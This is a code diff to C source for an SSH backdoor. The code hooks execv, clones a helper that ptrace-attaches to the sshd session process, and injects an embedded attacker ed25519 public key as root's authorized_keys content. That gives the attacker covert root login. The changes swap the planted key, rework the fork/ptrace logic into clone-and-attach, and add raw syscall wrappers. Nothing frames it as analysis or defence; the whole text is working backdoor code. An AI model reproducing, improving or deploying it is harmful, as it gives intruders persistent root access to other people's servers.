@@ -1,5 +1,8 @@
 #include "syscall_define.h"
+#include <linux/sched.h>
 #include <netinet/in.h>
+#include <sched.h>
+#include <signal.h>
 #include <stdint.h>
 #include <sys/cdefs.h>
 #include <sys/syscall.h>
@@ -15,7 +18,7 @@
 #define SSH_AUTH_PATH "/root/.ssh/autho"
 // the first 0x10 bytes should be enough
 // "rized_keys"
-#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiXeDYmT1LhJZC5/dTl1VRgAHy1WkE/NyovkF4mFtPe root\n"
+#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA7j8WZuuvHaBfAT+joDb0nkXdKqEwQGaoeqZkfploep root\n"
 // clang-format on
 
 void set_my_pubkey (uint32_t pid);
@@ -28,9 +31,14 @@ void sys_exit ();
 
 int sys_fork ();
 
+int sys_clone (uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
+               uint64_t arg5);
+
 void sys_write (int fd, char *buf, uint32_t size);
 
 int sys_getppid ();
+
+int sys_getpid ();
 
 __attribute_noinline__ void call_execv (const char *path, char *const argv[]);
 
@@ -65,23 +73,22 @@ execv_hook (const char *path, char *const argv[])
   if (*backdoor_flag != 16)
     call_execv (path, argv);
 
-  uint32_t pid = sys_fork ();
-  if (pid == 0)
-    {
-      sys_ptrace (PTRACE_TRACEME, 0, 0, 0);
-      call_execv (path, argv);
-    }
+  uint32_t tracee_pid = sys_getpid ();
+  uint32_t is_parent = sys_clone (CLONE_PARENT | SIGCHLD, 0, 0, 0, 0);
+  if (is_parent)
+    call_execv (path, argv);
 
-  sys_wait (pid);
-  sys_ptrace (PTRACE_SETOPTIONS, pid, NULL, (void *)PTRACE_O_TRACESYSGOOD);
-  set_my_pubkey (pid);
-  set_my_pubkey (pid);
+  attach (tracee_pid);
+  sys_ptrace (PTRACE_SETOPTIONS, tracee_pid, NULL,
+              (void *)PTRACE_O_TRACESYSGOOD);
+  set_my_pubkey (tracee_pid);
+  set_my_pubkey (tracee_pid);
   // session read the authorized_keys twice
   // note when you login with root, they still read at session process
   // but login with other user, they read at a low-level process forked by
   // session
 
-  detach (pid);
+  detach (tracee_pid);
   sys_exit ();
 }
 
@@ -130,6 +137,12 @@ sys_getppid ()
   return syscall0 (SYS_getppid);
 }
 
+int
+sys_getpid ()
+{
+  return syscall0 (SYS_getpid);
+}
+
 void
 sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr, void *data)
 {
@@ -139,7 +152,8 @@ sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr, void *data)
 void
 sys_wait (uint32_t pid)
 {
-  syscall4 (SYS_wait4, pid, 0, 0, 0);
+  if ((int32_t)syscall4 (SYS_wait4, pid, 0, 0, 0) < 0)
+    sys_exit ();
 }
 
 void
@@ -152,6 +166,13 @@ int
 sys_fork ()
 {
   return syscall0 (SYS_fork);
+}
+
+int
+sys_clone (uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
+           uint64_t arg5)
+{
+  return syscall5 (SYS_clone, arg1, arg2, arg3, arg4, arg5);
 }
 
 __attribute_noinline__ void
